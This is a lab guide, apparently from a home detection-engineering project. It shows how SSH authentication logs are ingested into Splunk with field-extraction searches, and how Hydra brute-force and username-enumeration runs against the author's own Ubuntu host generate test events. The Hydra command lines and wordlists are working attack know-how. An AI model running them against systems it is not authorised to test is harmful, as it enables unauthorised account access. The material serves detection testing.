# ***Data Ingestion \& Attack Simulation***

> This document explains how authentication logs were ingested into Splunk Enterprise and how SSH attack traffic was generated from Kali Linux for testing detection rules and alerts.

#### 

### **PART 1 – Data Ingestion**

##### Chapter 1: Add Linux Logs

Monitor `/var/log/auth.log` in Splunk via **Settings → Data Inputs → Files \& Directories → Add New**.

* Path: `/var/log/auth.log`
* Index: `main`
* Sourcetype: `linux\\\_secure` (or auto-detected)

Purpose: Continuously ingest SSH authentication logs.



\---



##### Chapter 2: Verify Data

SPL
index=main
Purpose: Verify events are indexed.



\---



##### Info 1: Index

`main` stores all authentication events used by searches, dashboards and alerts.



\---



##### Info 2: Sourcetype

`linux\\\_secure` identifies Linux authentication logs and helps Splunk parse them correctly.



\---



##### Chapter 3: Field Extraction

Extract IP:

SPL
| rex "from (?<Attacker\_IP>\\d+\\.\\d+\\.\\d+\\.\\d+)"



Extract Username:

SPL
| rex "for (invalid user )?(?<Username>\\w+)"



Extract Port:

SPL
| rex "port (?<Port>\\d+)"



Purpose: Convert raw logs into searchable fields.



\---



### **PART 2 – Attack Simulation**

##### Chapter 1: Install Hydra

Bash
hydra -h
sudo apt update
sudo apt install hydra -y



Purpose: Install and verify Hydra.



\---



##### Chapter 2: Create Password List

Bash
nano passwords.txt
Example passwords: 123456, password, ubuntu, password123.



\---



##### Chapter 3: Create Username List

Bash
nano users.txt
Example users: root, admin, ubuntu, bishav, oracle.



\---



##### Chapter 4: Successful Brute Force

Bash
hydra -l bishav -P passwords.txt ssh://<Ubuntu-IP>
Purpose: Generate multiple failed logins followed by one successful login.



\---



##### Chapter 5: Failed Brute Force

Bash
hydra -l bishav -p WrongPassword ssh://<Ubuntu-IP>
Purpose: Generate repeated failed login events.



\---



##### Chapter 6: Username Enumeration

Bash
hydra -L users.txt -p WrongPassword ssh://<Ubuntu-IP>
Purpose: Attempt multiple usernames with one password.



\---



##### Chapter 7: Manual SSH

Successful:

Bash
ssh bishav@<Ubuntu-IP>



Failed:

Bash
ssh invaliduser@<Ubuntu-IP>



\---



##### Info 3: Common Hydra Options

|Option|Description|
|-|-|
|-l|Single username|
|-L|Username list|
|-p|Single password|
|-P|Password list|
|-t|Parallel tasks|
|-V|Verbose|
|-f|Stop after first success|
|-I|Ignore restore file|

Example:

Bash
hydra -l bishav -P passwords.txt -t 4 -V -f ssh://<Ubuntu-IP>



### **Next Steps**

##### Validation

1. Run attack.
2. Search `index=main`.
3. Execute detection SPL.
4. Verify dashboard.
5. Confirm alert triggers.

